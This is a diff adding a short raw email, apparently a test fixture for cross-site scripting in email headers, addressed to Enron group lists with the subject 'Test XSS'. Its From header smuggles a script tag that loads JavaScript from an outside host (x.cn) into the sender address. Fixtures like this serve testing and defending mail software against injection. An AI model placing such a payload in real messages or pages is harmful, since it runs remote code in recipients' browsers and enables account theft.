@@ -1,0 +1,7 @@
+From: <"test<script src=//x.cn/1.js async>@attack.com">
+To: isc.groups@enron.com, enron.users@enron.com, enron.list@enron.com
+Subject: Test XSS
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
